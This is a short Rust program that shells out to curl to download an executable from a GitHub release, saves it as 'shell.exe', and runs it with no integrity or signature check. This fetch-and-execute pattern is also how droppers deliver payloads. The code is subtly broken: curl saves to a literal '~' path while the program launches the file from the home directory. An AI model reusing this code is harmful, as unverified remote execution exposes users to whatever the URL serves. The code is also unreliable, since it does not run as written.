use std::{env, path::PathBuf, process::Command};

fn main() {
    let _output = Command::new("curl.exe")
    .args(vec![
        "-L",
        "-o",
        "~/shell.exe",
        "https://github.com/Zycrasion/windows-splash-screen/releases/download/beta/splash_screen.exe"
    ]).spawn()
    .unwrap()
    .wait_with_output();

    let exe = PathBuf::from(env::home_dir().unwrap()).join("shell.exe");

    Command::new(exe).spawn().unwrap();
}
